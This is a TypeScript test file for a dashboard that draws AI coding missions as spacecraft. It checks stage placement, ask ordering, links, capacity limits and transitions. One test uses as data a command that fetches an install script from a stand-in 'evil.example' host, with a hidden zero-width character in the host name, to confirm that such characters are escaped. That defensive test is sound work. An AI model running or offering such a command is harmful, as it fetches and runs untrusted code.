import { describe, expect, it } from 'vitest';
import {
  buildFleetModel,
  PAD_CAPACITY,
  LANE_CAPACITY,
  SITE_CAPACITY,
  AFLOAT_CAPACITY,
  type CraftPlace,
  type BoardAskKind,
} from './fleet';
import { makeGeom, poseAt, timeline } from './flightPlan';
import { missionHash, repoHash, repoHashFor, ticketHash } from '../routes';
import type { PipelineStage } from '../pipelineStage';
import type {
  GateEvaluation,
  LivePermission,
  MissionState,
  MissionSummary,
  TicketSummary,
} from '../types';

const NOW_MS = Date.parse('2026-10-08T12:00:00Z');

function makeTicket(overrides: Partial<TicketSummary> = {}): TicketSummary {
  return {
    slug: 't-1',
    priority: 2,
    state: 'new',
    title: 'Ticket title',
    blockedBy: [],
    isBlocked: false,
    missionId: null,
    ...overrides,
  };
}

function makeMission(overrides: Partial<MissionSummary> = {}): MissionSummary {
  return {
    id: 'm-1',
    status: 'running',
    goal: 'Mission goal',
    createdAt: '2026-10-08T11:00:00Z',
    merged: null,
    ...overrides,
  };
}

function makeState(id: string, overrides: Partial<MissionState> = {}): MissionState {
  return {
    mission: {
      id,
      status: 'running',
      goal: `Goal for ${id}`,
      baseBranch: 'main',
      missionBranch: `kranz/mission-${id}`,
      createdAt: '2026-10-08T11:00:00Z',
      validationContract: [],
      milestones: [
        {
          id: 'ms-1',
          title: 'Milestone 1',
          status: 'active',
          features: [
            {
              id: 'f-1',
              title: 'Feature 1',
              spec: 'Spec 1',
              validationCriteria: [],
              origin: 'plan',
              status: 'complete',
              workerRuns: [],
              commits: ['abc'],
              respawns: 0,
            },
            {
              id: 'f-2',
              title: 'Feature 2',
              spec: 'Spec 2',
              validationCriteria: [],
              origin: 'plan',
              status: 'pending',
              workerRuns: [],
              commits: [],
              respawns: 0,
            },
          ],
          fixCycles: 0,
        },
      ],
    },
    runs: {},
    totals: { input: 100, output: 50, cacheRead: 0, cacheWrite: 0 },
    totalCostUsd: 1.25,
    localExecutorMilestones: 0,
    escalatedMilestones: 0,
    pendingUserMessages: [],
    recentDecisions: [],
    config: {
      orchestrator: { model: 'opus', reasoningEffort: 'high', maxBudgetUsd: 10 },
      worker: { model: 'sonnet', reasoningEffort: 'medium', maxBudgetUsd: 5 },
      validatorScrutiny: { model: 'opus', reasoningEffort: 'high', maxBudgetUsd: 5 },
      validatorFunctional: { model: 'sonnet', reasoningEffort: 'medium', maxBudgetUsd: 5 },
      skipScrutiny: false,
      skipFunctional: false,
      maxFixCyclesPerMilestone: 2,
      maxRespawns: 2,
      maxParallelWorkers: 1,
      eventStreamThrottleMs: 250,
      denyPatterns: [],
      allowValidatorCommands: [],
      dangerouslyAllowAll: false,
      allowBelowDefaultWorkerModel: false,
    },
    latestPlanRevision: 1,
    lastSeq: 10,
    ...overrides,
  };
}

function makePermission(id: string): LivePermission {
  return {
    request: {
      proposal: {
        id,
        engineSessionId: 'eng-1',
        peerSessionId: 'peer-1',
        peerRequestId: `req-${id}`,
        toolCallId: `tc-${id}`,
        action: { tool: 'bash', command: 'cargo test' },
        options: [{ optionId: 'allow_once', kind: 'allow_once', name: 'Allow once' }],
        actionDigest: `sha256:act-${id}`,
        optionsDigest: `sha256:opt-${id}`,
        observedAt: new Date(NOW_MS).toISOString(),
        deadline: new Date(NOW_MS + 60_000).toISOString(),
        prohibition: null,
      },
      binding: {
        missionId: 'm-1',
        runId: 'r-1',
        workspace: '/tmp/ws',
        planDigest: 'sha256:plan',
        policyDigest: 'sha256:policy',
      },
      bindingDigest: `sha256:bind-${id}`,
    },
  };
}

function makeGate(attemptId: string): GateEvaluation {
  return {
    requested: {
      request: {
        params: {
          attemptId,
          gateId: 'security-review',
          stage: 'milestone',
          subject: { milestoneId: 'ms-1' },
          deadline: new Date(NOW_MS + 60_000).toISOString(),
          binding: {
            missionId: 'm-1',
            planDigest: 'sha256:plan',
            subjectCommit: 'abc1234',
          },
        },
      },
    },
    requestedSeq: 2,
    resolution: {
      disposition: 'require-human',
      rationale: 'needs human check',
    },
    consumed: false,
  };
}

describe('buildFleetModel — eleven pipeline stages and ring rules', () => {
  interface StageCase {
    name: string;
    stage: PipelineStage;
    tickets: TicketSummary[];
    missions: MissionSummary[];
    states?: Map<string, MissionState>;
    expectedPlace: CraftPlace;
    expectedRing: boolean;
  }

  const cases: StageCase[] = [
    {
      name: 'ticket-backed captured',
      stage: 'captured',
      tickets: [makeTicket({ slug: 't-cap', state: 'new' })],
      missions: [],
      expectedPlace: 'hangar',
      expectedRing: false,
    },
    {
      name: 'ticket-backed drafting',
      stage: 'drafting',
      tickets: [makeTicket({ slug: 't-draft', state: 'drafting', missionId: 'm-draft' })],
      missions: [makeMission({ id: 'm-draft', status: 'planning' })],
      expectedPlace: 'pad',
      expectedRing: false,
    },
    {
      name: 'ticket-backed needs-you',
      stage: 'needs-you',
      tickets: [makeTicket({ slug: 't-ny', state: 'needs-context' })],
      missions: [],
      expectedPlace: 'pad',
      expectedRing: true,
    },
    {
      name: 'ticket-backed wrong-plan',
      stage: 'wrong-plan',
      tickets: [makeTicket({ slug: 't-wp', state: 'wrong-plan' })],
      missions: [],
      expectedPlace: 'pad',
      expectedRing: true,
    },
    {
      name: 'ticket-backed reviewable',
      stage: 'reviewable',
      tickets: [makeTicket({ slug: 't-rev', state: 'review', missionId: 'm-rev' })],
      missions: [makeMission({ id: 'm-rev', status: 'planning' })],
      expectedPlace: 'pad',
      expectedRing: true,
    },
    {
      name: 'ticketless reviewable (planning mission)',
      stage: 'reviewable',
      tickets: [],
      missions: [makeMission({ id: 'm-rev-orphan', status: 'planning' })],
      expectedPlace: 'pad',
      expectedRing: true,
    },
    {
      name: 'ticket-backed queued',
      stage: 'queued',
      tickets: [makeTicket({ slug: 't-q', state: 'queued', missionId: 'm-q' })],
      missions: [makeMission({ id: 'm-q', status: 'approved' })],
      expectedPlace: 'pad',
      expectedRing: false,
    },
    {
      name: 'ticketless queued (approved mission)',
      stage: 'queued',
      tickets: [],
      missions: [makeMission({ id: 'm-q-orphan', status: 'approved' })],
      expectedPlace: 'pad',
      expectedRing: false,
    },
    {
      name: 'ticket-backed running without in-flight ask',
      stage: 'running',
      tickets: [makeTicket({ slug: 't-run', state: 'running', missionId: 'm-run' })],
      missions: [makeMission({ id: 'm-run', status: 'running' })],
      states: new Map([['m-run', makeState('m-run')]]),
      expectedPlace: 'earth-orbit',
      expectedRing: false,
    },
    {
      name: 'ticketless running with in-flight grant ask',
      stage: 'running',
      tickets: [],
      missions: [makeMission({ id: 'm-run-ask', status: 'running' })],
      states: new Map([
        [
          'm-run-ask',
          makeState('m-run-ask', {
            pendingGrantRequest: {
              milestoneId: 'ms-1',
              kind: 'command',
              command: 'cargo test',
            },
          }),
        ],
      ]),
      expectedPlace: 'earth-orbit',
      expectedRing: true,
    },
    {
      name: 'ticket-backed delivered',
      stage: 'delivered',
      tickets: [makeTicket({ slug: 't-del', state: 'done', missionId: 'm-del' })],
      missions: [makeMission({ id: 'm-del', status: 'complete', merged: false })],
      expectedPlace: 'lunar-orbit',
      expectedRing: true,
    },
    {
      name: 'ticketless delivered',
      stage: 'delivered',
      tickets: [],
      missions: [makeMission({ id: 'm-del-orphan', status: 'complete', merged: false })],
      expectedPlace: 'lunar-orbit',
      expectedRing: true,
    },
    {
      name: 'ticket-backed landed',
      stage: 'landed',
      tickets: [makeTicket({ slug: 't-land', state: 'done', missionId: 'm-land' })],
      missions: [makeMission({ id: 'm-land', status: 'complete', merged: true })],
      expectedPlace: 'lunar-surface',
      expectedRing: false,
    },
    {
      name: 'ticketless landed',
      stage: 'landed',
      tickets: [],
      missions: [makeMission({ id: 'm-land-orphan', status: 'complete', merged: true })],
      expectedPlace: 'lunar-surface',
      expectedRing: false,
    },
    {
      name: 'ticket-backed failed',
      stage: 'failed',
      tickets: [makeTicket({ slug: 't-fail', state: 'failed', missionId: 'm-fail' })],
      missions: [makeMission({ id: 'm-fail', status: 'failed' })],
      expectedPlace: 'free-return',
      expectedRing: true,
    },
    {
      name: 'ticketless failed',
      stage: 'failed',
      tickets: [],
      missions: [makeMission({ id: 'm-fail-orphan', status: 'failed' })],
      expectedPlace: 'free-return',
      expectedRing: true,
    },
    {
      name: 'ticketless abandoned',
      stage: 'abandoned',
      tickets: [],
      missions: [makeMission({ id: 'm-ab-orphan', status: 'abandoned' })],
      expectedPlace: 'abandoned',
      expectedRing: false,
    },
  ];

  it.each(cases)('$name -> stage=$stage place=$expectedPlace ring=$expectedRing', (tc) => {
    const model = buildFleetModel(tc.tickets, tc.missions, tc.states ?? new Map(), NOW_MS);
    expect(model.crafts).toHaveLength(1);
    const craft = model.crafts[0];
    expect(craft.stage).toBe(tc.stage);
    expect(craft.place).toBe(tc.expectedPlace);
    expect(craft.ring).toBe(tc.expectedRing);
  });
});

describe('buildFleetModel — asks, urgency ordering, and links', () => {
  it('captured and queued never carry an ask, running carries an ask iff pendingAsks returns one, and urgency order holds', () => {
    const tickets: TicketSummary[] = [
      makeTicket({ slug: 't-captured', state: 'new' }),
      makeTicket({ slug: 't-queued', state: 'queued', missionId: 'm-queued' }),
      makeTicket({ slug: 't-failed', state: 'failed', missionId: 'm-failed' }),
      makeTicket({ slug: 't-delivered', state: 'done', missionId: 'm-delivered' }),
      makeTicket({ slug: 't-reviewable', state: 'review', missionId: 'm-reviewable' }),
      makeTicket({ slug: 't-wrong', state: 'wrong-plan' }),
      makeTicket({ slug: 't-needs', state: 'needs-context' }),
    ];

    const missions: MissionSummary[] = [
      makeMission({ id: 'm-queued', status: 'approved', createdAt: '2026-10-08T09:00:00Z' }),
      makeMission({ id: 'm-failed', status: 'failed', createdAt: '2026-10-08T09:05:00Z' }),
      makeMission({
        id: 'm-delivered',
        status: 'complete',
        merged: false,
        createdAt: '2026-10-08T09:10:00Z',
      }),
      makeMission({ id: 'm-reviewable', status: 'planning', createdAt: '2026-10-08T09:15:00Z' }),
      makeMission({ id: 'm-quiet-run', status: 'running', createdAt: '2026-10-08T09:20:00Z' }),
      // Two grant missions to verify oldest-mission-first within the same ask kind:
      makeMission({ id: 'm-grant-newer', status: 'running', createdAt: '2026-10-08T10:30:00Z' }),
      makeMission({ id: 'm-grant-older', status: 'running', createdAt: '2026-10-08T10:00:00Z' }),
      makeMission({ id: 'm-all-inflight', status: 'running', createdAt: '2026-10-08T10:15:00Z' }),
    ];

    const states = new Map<string, MissionState>([
      ['m-quiet-run', makeState('m-quiet-run')],
      [
        'm-grant-newer',
        makeState('m-grant-newer', {
          pendingGrantRequest: { milestoneId: 'ms-1', kind: 'command', command: 'npm test' },
        }),
      ],
      [
        'm-grant-older',
        makeState('m-grant-older', {
          pendingGrantRequest: { milestoneId: 'ms-1', kind: 'egress', command: 'example.com:443' },
        }),
      ],
      [
        'm-all-inflight',
        {
          ...makeState('m-all-inflight', {
            permissions: { 'p-1': makePermission('p-1') },
            gateEvaluations: { 'g-1': makeGate('g-1') },
            pendingRevision: {
              revision: 2,
              instructions: 'split milestone',
              plan: { goal: 'Goal', validationContract: [], milestones: [] },
            },
            pendingQuestions: [{ questionId: 'q-1', role: 'worker', text: 'Which port?' }],
          }),
          mission: {
            ...makeState('m-all-inflight').mission,
            status: 'blocked',
          },
        },
      ],
    ]);

    const model = buildFleetModel(tickets, missions, states, NOW_MS);

    // captured, queued, and quiet running never produce an ask
    expect(model.asks.some((a) => a.workItemId === 't-captured')).toBe(false);
    expect(model.asks.some((a) => a.workItemId === 't-queued')).toBe(false);
    expect(model.asks.some((a) => a.workItemId === 'm-quiet-run')).toBe(false);
    expect(model.byKey.get('mission-m-quiet-run')?.ring).toBe(false);
    expect(model.byKey.get('mission-m-all-inflight')?.ring).toBe(true);

    const kinds: BoardAskKind[] = model.asks.map((a) => a.kind);
    expect(kinds).toEqual([
      'permission',
      'grant',
      'grant',
      'blocked',
      'gate',
      'revision',
      'question',
      'needs-you',
      'wrong-plan',
      'reviewable',
      'delivered',
      'failed',
    ]);

    // Oldest mission first within 'grant'
    const grantAsks = model.asks.filter((a) => a.kind === 'grant');
    expect(grantAsks.map((a) => a.workItemId)).toEqual(['m-grant-older', 'm-grant-newer']);
  });

  it('links each ask kind to the exact routes.ts helper for both unscoped and repo-scoped hashes', () => {
    const tickets: TicketSummary[] = [
      makeTicket({ slug: 't-needs', state: 'needs-context' }),
      makeTicket({ slug: 't-wrong', state: 'wrong-plan' }),
      makeTicket({ slug: 't-rev', state: 'review', missionId: 'm-rev-ticket' }),
      makeTicket({ slug: 't-fail', state: 'failed', missionId: 'm-fail-ticket' }),
    ];
    const missions: MissionSummary[] = [
      makeMission({ id: 'm-rev-ticket', status: 'planning' }),
      makeMission({ id: 'm-rev-orphan', status: 'planning' }),
      makeMission({ id: 'm-run', status: 'running' }),
      makeMission({ id: 'm-del', status: 'complete', merged: false }),
      makeMission({ id: 'm-fail-ticket', status: 'failed' }),
      makeMission({ id: 'm-fail-orphan', status: 'failed' }),
    ];
    const states = new Map<string, MissionState>([
      [
        'm-run',
        makeState('m-run', {
          pendingGrantRequest: { milestoneId: 'ms-1', kind: 'command', command: 'cargo test' },
        }),
      ],
    ]);

    // 1. Unscoped (#/board)
    window.location.hash = '#/board';
    const unscoped = buildFleetModel(tickets, missions, states, NOW_MS, null, '#/board');
    const unscopedByItem = new Map(unscoped.asks.map((a) => [`${a.kind}:${a.workItemId}`, a.href]));

    expect(unscopedByItem.get('grant:m-run')).toBe(missionHash('m-run'));
    expect(unscopedByItem.get('delivered:m-del')).toBe(missionHash('m-del'));
    expect(unscopedByItem.get('needs-you:t-needs')).toBe(ticketHash('t-needs'));
    expect(unscopedByItem.get('wrong-plan:t-wrong')).toBe(ticketHash('t-wrong'));
    expect(unscopedByItem.get('reviewable:t-rev')).toBe(repoHash(''));
    expect(unscopedByItem.get('reviewable:m-rev-orphan')).toBe(missionHash('m-rev-orphan'));
    expect(unscopedByItem.get('failed:t-fail')).toBe(ticketHash('t-fail'));
    expect(unscopedByItem.get('failed:m-fail-orphan')).toBe(missionHash('m-fail-orphan'));

    // 2. Repo-scoped (#/r/alpha/board)
    window.location.hash = '#/r/alpha/board';
    const scoped = buildFleetModel(tickets, missions, states, NOW_MS, null, '#/r/alpha/board');
    const scopedByItem = new Map(scoped.asks.map((a) => [`${a.kind}:${a.workItemId}`, a.href]));

    expect(scopedByItem.get('grant:m-run')).toBe(repoHashFor('alpha', 'm/m-run'));
    expect(scopedByItem.get('delivered:m-del')).toBe(repoHashFor('alpha', 'm/m-del'));
    expect(scopedByItem.get('needs-you:t-needs')).toBe(repoHashFor('alpha', 'backlog/t-needs'));
    expect(scopedByItem.get('wrong-plan:t-wrong')).toBe(repoHashFor('alpha', 'backlog/t-wrong'));
    expect(scopedByItem.get('reviewable:t-rev')).toBe(repoHashFor('alpha', ''));
    expect(scopedByItem.get('reviewable:m-rev-orphan')).toBe(repoHashFor('alpha', 'm/m-rev-orphan'));
    expect(scopedByItem.get('failed:t-fail')).toBe(repoHashFor('alpha', 'backlog/t-fail'));
    expect(scopedByItem.get('failed:m-fail-orphan')).toBe(repoHashFor('alpha', 'm/m-fail-orphan'));
  });
});

describe('buildFleetModel — capacity rules', () => {
  it('allocates 4 pads with ringed ground items first and reports overflow in the hangar', () => {
    // 6 ground items: 1 unringed drafting + 5 ringed (needs-you / wrong-plan / reviewable)
    const tickets: TicketSummary[] = [
      makeTicket({ slug: 't-draft', state: 'drafting', missionId: 'm-draft' }),
      makeTicket({ slug: 't-ring-1', state: 'needs-context' }),
      makeTicket({ slug: 't-ring-2', state: 'wrong-plan' }),
      makeTicket({ slug: 't-ring-3', state: 'review' }),
      makeTicket({ slug: 't-ring-4', state: 'needs-context' }),
      makeTicket({ slug: 't-ring-5', state: 'wrong-plan' }),
    ];
    const missions: MissionSummary[] = [makeMission({ id: 'm-draft', status: 'planning' })];

    const model = buildFleetModel(tickets, missions, new Map(), NOW_MS);
    const onPads = model.crafts.filter((c) => c.place === 'pad');
    expect(onPads).toHaveLength(PAD_CAPACITY);
    expect(onPads.every((c) => c.ring)).toBe(true);
    expect(new Set(onPads.map((c) => c.craft.pad))).toEqual(new Set([0, 1, 2, 3]));

    expect(model.hangar).toEqual({
      total: 2,
      captured: 0,
      overflow: 2,
      ringed: 1,
    });
    // The asks list is never truncated by pad capacity
    expect(model.asks).toHaveLength(5);
  });

  it('places 7 running craft across lanes 0..4 with unique (lane, angleSlot) pairs', () => {
    const missions = Array.from({ length: 7 }, (_, i) =>
      makeMission({
        id: `m-run-${i}`,
        status: 'running',
        createdAt: new Date(NOW_MS - (10 - i) * 60_000).toISOString(),
      }),
    );
    const model = buildFleetModel([], missions, new Map(), NOW_MS);
    expect(model.crafts).toHaveLength(7);

    const pairs = new Set<string>();
    for (const c of model.crafts) {
      expect(c.craft.lane).not.toBeNull();
      expect(c.craft.lane!).toBeGreaterThanOrEqual(0);
      expect(c.craft.lane!).toBeLessThan(LANE_CAPACITY);
      expect(c.angleSlot).not.toBeNull();
      const key = `${c.craft.lane}:${c.angleSlot}`;
      expect(pairs.has(key)).toBe(false);
      pairs.add(key);
    }
  });

  it('assigns landing sites to the 12 most recently created landed items out of 15', () => {
    const missions = Array.from({ length: 15 }, (_, i) =>
      makeMission({
        id: `m-land-${i}`,
        status: 'complete',
        merged: true,
        createdAt: new Date(NOW_MS - (20 - i) * 60_000).toISOString(),
      }),
    );
    const model = buildFleetModel([], missions, new Map(), NOW_MS);
    const withSites = model.crafts.filter((c) => c.craft.site !== null);
    expect(withSites).toHaveLength(SITE_CAPACITY);
    // Items 3..14 are the 12 most recently created
    expect(withSites.map((c) => c.id)).toEqual(
      Array.from({ length: 12 }, (_, i) => `m-land-${i + 3}`),
    );
  });

  it('keeps only the 3 most recently created failed items afloat out of 5', () => {
    const missions = Array.from({ length: 5 }, (_, i) =>
      makeMission({
        id: `m-fail-${i}`,
        status: 'failed',
        createdAt: new Date(NOW_MS - (10 - i) * 60_000).toISOString(),
      }),
    );
    const model = buildFleetModel([], missions, new Map(), NOW_MS);
    const afloat = model.crafts.filter((c) => c.craft.afloat);
    expect(afloat).toHaveLength(AFLOAT_CAPACITY);
    expect(afloat.map((c) => c.id)).toEqual(['m-fail-2', 'm-fail-3', 'm-fail-4']);
    // All 5 failed items remain in the asks list
    expect(model.asks).toHaveLength(5);
  });
});

describe('buildFleetModel — steady state, transitions, and visible() escaping', () => {
  it('places every craft in its steady-state phase on first sight with zero transitions', () => {
    const G = makeGeom('wide');
    const tickets: TicketSummary[] = [
      makeTicket({ slug: 't-cap', state: 'new' }),
      makeTicket({ slug: 't-rev', state: 'review' }),
    ];
    const missions: MissionSummary[] = [
      makeMission({ id: 'm-run', status: 'running' }),
      makeMission({ id: 'm-del', status: 'complete', merged: false }),
      makeMission({ id: 'm-land', status: 'complete', merged: true }),
      makeMission({ id: 'm-fail', status: 'failed' }),
      makeMission({ id: 'm-ab', status: 'abandoned' }),
    ];

    const model = buildFleetModel(tickets, missions, new Map(), NOW_MS, null);
    expect(model.transitions).toEqual([]);

    const nowSec = NOW_MS / 1000;
    const phaseOf = (key: string) => {
      const fc = model.byKey.get(key)!;
      const tl = timeline(G, fc.craft);
      return poseAt(G, fc.craft, tl, nowSec)?.phase ?? null;
    };

    expect(phaseOf('ticket-t-cap')).toBeNull();
    expect(phaseOf('ticket-t-rev')).toBe('pad');
    expect(phaseOf('mission-m-run')).toBe('earth-orbit');
    expect(phaseOf('mission-m-del')).toBe('lunar-orbit');
    expect(phaseOf('mission-m-land')).toBeNull(); // landed > STAY+LIFT ago, flag left behind
    expect(phaseOf('mission-m-fail')).toBe('splash');
    expect(phaseOf('mission-m-ab')).toBeNull();
  });

  it('reports single-step transitions once, ignores multi-step jumps, and is idempotent on identical inputs', () => {
    const t0 = NOW_MS;
    const m0 = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'queued', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'approved' })],
      new Map(),
      t0,
      null,
    );
    expect(m0.transitions).toEqual([]);

    // Identical consecutive build reports nothing and yields deeply equal crafts
    const m0Repeat = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'queued', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'approved' })],
      new Map(),
      t0 + 1_000,
      m0,
    );
    expect(m0Repeat.transitions).toEqual([]);
    expect(m0Repeat.crafts).toEqual(m0.crafts);

    // 1. ground (queued) -> running
    const t1 = t0 + 5_000;
    const m1 = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'running', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'running' })],
      new Map(),
      t1,
      m0,
    );
    expect(m1.transitions).toEqual([
      { key: 'ticket-t-1', id: 't-1', from: 'queued', to: 'running', at: t1 },
    ]);

    // 2. running -> delivered
    const t2 = t1 + 20_000;
    const m2 = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'done', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'complete', merged: false })],
      new Map(),
      t2,
      m1,
    );
    expect(m2.transitions).toEqual([
      { key: 'ticket-t-1', id: 't-1', from: 'running', to: 'delivered', at: t2 },
    ]);

    // 3. delivered -> landed
    const t3 = t2 + 20_000;
    const m3 = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'done', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'complete', merged: true })],
      new Map(),
      t3,
      m2,
    );
    expect(m3.transitions).toEqual([
      { key: 'ticket-t-1', id: 't-1', from: 'delivered', to: 'landed', at: t3 },
    ]);

    // 4. running -> failed
    const t4 = t1 + 15_000;
    const mFail = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'failed', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'failed' })],
      new Map(),
      t4,
      m1,
    );
    expect(mFail.transitions).toEqual([
      { key: 'ticket-t-1', id: 't-1', from: 'running', to: 'failed', at: t4 },
    ]);

    // 5. any -> abandoned (ticketless mission)
    const mRunOrphan = buildFleetModel(
      [],
      [makeMission({ id: 'm-2', status: 'running' })],
      new Map(),
      t1,
      null,
    );
    const mAbandon = buildFleetModel(
      [],
      [makeMission({ id: 'm-2', status: 'abandoned' })],
      new Map(),
      t4,
      mRunOrphan,
    );
    expect(mAbandon.transitions).toEqual([
      { key: 'mission-m-2', id: 'm-2', from: 'running', to: 'abandoned', at: t4 },
    ]);

    // Multi-step jump (ground -> landed) reports nothing and snaps to steady state
    const mJump = buildFleetModel(
      [makeTicket({ slug: 't-1', state: 'done', missionId: 'm-1' })],
      [makeMission({ id: 'm-1', status: 'complete', merged: true })],
      new Map(),
      t3,
      m0,
    );
    expect(mJump.transitions).toEqual([]);
  });

  it('escapes zero-width characters in ticket titles and grant targets via visible()', () => {
    const tickets: TicketSummary[] = [
      makeTicket({
        slug: 't\u200b-zw',
        state: 'running',
        title: 'Title with \u200b hidden char',
        missionId: 'm-zw',
      }),
    ];
    const missions: MissionSummary[] = [makeMission({ id: 'm-zw', status: 'running' })];
    const states = new Map<string, MissionState>([
      [
        'm-zw',
        makeState('m-zw', {
          pendingGrantRequest: {
            milestoneId: 'ms-1',
            kind: 'command',
            command: 'curl https://evil\u200b.example/install.sh',
          },
        }),
      ],
    ]);

    const model = buildFleetModel(tickets, missions, states, NOW_MS);
    expect(model.crafts[0].label).toContain('\\u200b');
    expect(model.crafts[0].title).toContain('\\u200b');
    expect(model.asks[0].title).toContain('\\u200b');
    expect(model.asks[0].detail).toContain('\\u200b');
  });
});
